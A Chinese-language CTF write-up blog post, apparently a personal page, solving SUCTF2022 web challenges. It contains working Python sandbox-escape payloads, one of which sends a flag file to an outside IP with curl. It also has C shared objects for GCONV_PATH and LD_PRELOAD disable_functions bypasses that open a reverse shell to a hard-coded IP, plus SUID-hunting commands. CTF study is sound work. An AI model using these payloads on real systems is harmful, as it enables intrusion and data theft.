@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="calcapp.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#coding&#x3D;utf-8from flask import Flask,render_template,url_for,render_template_string,redirect,request">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2022WEB">
+<meta property="og:url" content="https://tefuir72.github.io/2022/03/26/2022032619/index.html">
+<meta property="og:site_name" content="TeFuir&#39;Blog">
+<meta property="og:description" content="calcapp.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#coding&#x3D;utf-8from flask import Flask,render_template,url_for,render_template_string,redirect,request">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326200538842.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326200557887.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326200929410.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326202720576.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326201711231.png">
+<meta property="article:published_time" content="2022-03-26T11:54:49.000Z">
+<meta property="article:modified_time" content="2022-03-31T04:45:35.363Z">
+<meta property="article:author" content="Te Fuir">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tefuir72.github.io/2022/03/26/2022032619/2022032619/image-20220326200538842.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SUCTF2022WEB</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2022/03/26/2022032620/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2022/03/22/2022032222/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/26/2022032619/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/26/2022032619/&text=SUCTF2022WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/26/2022032619/&is_video=false&description=SUCTF2022WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/26/2022032619/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/26/2022032619/&name=SUCTF2022WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/26/2022032619/&t=SUCTF2022WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">1.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">2.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upgdstore"><span class="toc-number">3.</span> <span class="toc-text">upgdstore</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SUCTF2022WEB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Te Fuir</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-26T11:54:49.000Z" itemprop="datePublished">2022-03-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>sctf2020中 pysandbox 1＆2题目与其类似,拿来分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># app.py</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])</span><br><span class="line">def security():</span><br><span class="line">    secret = request.form[&quot;cmd&quot;]</span><br><span class="line">    for i in secret:</span><br><span class="line">        if not 42 &lt;= ord(i) &lt;= 122:</span><br><span class="line">            return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line">    exec(secret)</span><br><span class="line">    return &quot;xXXxXXx&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br></pre></td></tr></table></figure>
+
+<p>打开调试,分析<strong>flask处理流程</strong></p>
+<p>当服务器接收到请求时,都会调用cli.py中的<code>DispatchingApp#__call</code>__方法从而调用app.py中WSGI接口的<code>__call__</code>方法</p>
+<p><img src="2022032619/image-20220326200538842.png" alt="image-20220326200538842"></p>
+<p><img src="2022032619/image-20220326200557887.png" alt="image-20220326200557887"></p>
+<p>程序进入该方法,在此推送上下文并调用<code>full_dispatch_request()</code>方法处理请求</p>
+<p><img src="2022032619/image-20220326200929410.png" alt="image-20220326200929410"></p>
+<p>在这个方法中先是调用<code>preprocess_request()</code>在请求发送之前调用该方法执行所有使用<code>before_request</code>钩子注册过的函数.然后调用<code>dispatch_request()</code>方法分发请求</p>
+<p><img src="2022032619/image-20220326202720576.png" alt="image-20220326202720576"></p>
+<p>在这个方法中会匹配url并且返回视图函数<code>view_functions[rule.endpoint](**req.view_args)</code>的值</p>
+<p><img src="2022032619/image-20220326201711231.png" alt="image-20220326201711231"></p>
+<p>回到<code>full_dispatch_request()</code>中,视图函数的值(此时是<code>&#39;xXXxXXx&#39;</code>)返回给了<code>rv</code>最后调用<code>finalize_request(rv)</code>完成请求</p>
+<p>以上便是flask处理请求的简单流程</p>
+<p>此外Flask 提供了两种上下文,请求上下文和程序上下文,分别是request ,session和 current_app , g</p>
+<p>当题目ban了<strong>小括号</strong>时,不能直接执行函数,但eval\exec可以直接访问到程序上下文,每次请求进出都只会改变请求上下文和程序上下文,通过对flask流程中调用的函数进行劫持从而执行函数</p>
+<p>在pysandbox这题中,可以劫持<code>view_functions</code>函数从而使得返回的<code>rv</code>可控,再劫持<code>finalize_request(rv)</code>函数最终可以完成任意函数的调用</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=app.view_functions[request.form[[].__doc__[1]]]=lambda:request.form[[].__doc__[0]];app.finalize_request=eval&amp;u=security&amp;B=__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/214255#h2-0">参考</a></p>
+<p>此外这个题目另一个解法是劫持<code>ord</code>函数使其使用返回42从而任意命令执行</p>
+<p><code>[].doc[0]返回B\ord.__name</code>__绕过引号, <code>lambda*x:42</code>可以绕过空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=__builtins__[request.form[[].__doc__[0]]]=lambda*x:42&amp;B=ord</span><br></pre></td></tr></table></figure>
+
+<p>同时,条件许可的情况下可以直接更改过滤调用用的函数使其始终返回1从而绕过,比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.view_functions[&#x27;security&#x27;].__globals__[&#x27;waf&#x27;]=lambda*x:1</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://l.xdsec.org/archives/379.html">sctf2020</a></p>
+<p>回到这题,由于禁了’_’符号导致要想命令执行得依靠后面得os.system</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123%23`curl%09http://101.43.35.153:8889/\`cat%09/T*\``</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>简单反序列化,换行符绕过注释</p>
+<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p><strong>绕过disablefunction</strong></p>
+<p>利用move_uploaded_file上传文件</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51458899/article/details/123782291">https://blog.csdn.net/weixin_51458899/article/details/123782291</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// exp.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void gconv() &#123;&#125;</span><br><span class="line"></span><br><span class="line">void gconv_init() &#123;</span><br><span class="line">  system(&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// gcc exp.c -o exp.so -shared -fPIC</span><br><span class="line"></span><br><span class="line">// gconv-modules</span><br><span class="line">module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2 </span><br><span class="line">module  INTERNAL   EXP//    ../../../../../../../../tmp/exp    2</span><br><span class="line"></span><br><span class="line">// post</span><br><span class="line">putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#x27;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>利用DirectoryIterator类和glob://协议来匹配处随机名字的临时文件配合临时文件上传so文件,使用putenv()来指定LD_PRELOAD的值mail()触发命令执行.</p>
+<p><a target="_blank" rel="noopener" href="https://yenannn.github.io/2022/03/27/SU-DASCTF-wp/#upload">https://yenannn.github.io/2022/03/27/SU-DASCTF-wp/#upload</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403#h2-3">LD_PRELOAD</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/81.70.59.112/18888 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">system(cmdline); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># unsetenv(“LD_PRELOAD”)在某些Linux发行版不一定生效</span></span><br><span class="line"><span class="meta"># system函数默认是sh -c 来执行命令，而debian系的Linux /bin/sh 链接到了/bin/dash redhat系则是链接到了 /bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传表单 慎用bp上传</span></span><br><span class="line">&lt;form action=<span class="string">&quot;http://380bb2af-a2a7-4a6c-873d-92a4ce3cd478.node4.buuoj.cn:81/uploads/25a452927110e39a345a2511c57647f2.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// post</span></span><br><span class="line">&lt;?php</span><br><span class="line">(<span class="string">&#x27;put&#x27;</span><span class="number">.&#x27;</span>env<span class="number">&#x27;</span>)(<span class="string">&quot;LD_PRELOAD=/tmp/&quot;</span>.(<span class="keyword">new</span> DirectoryIterator(<span class="string">&quot;glob:///tmp/php??????&quot;</span>)));</span><br><span class="line">mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此外gd库函数可以使用</p>
+<p>github使用工具二次渲染图片</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yjUpUoTht-0eodl24Q6HEA">利用gd库上传文件</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php imagegif(imagecreatefromgif(&#x27;http://vps/exp.gif&#x27;), &#x27;3.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>提权</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">1.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">2.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upgdstore"><span class="toc-number">3.</span> <span class="toc-text">upgdstore</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/26/2022032619/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/26/2022032619/&text=SUCTF2022WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/26/2022032619/&is_video=false&description=SUCTF2022WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/26/2022032619/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/26/2022032619/&title=SUCTF2022WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/26/2022032619/&name=SUCTF2022WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/26/2022032619/&t=SUCTF2022WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
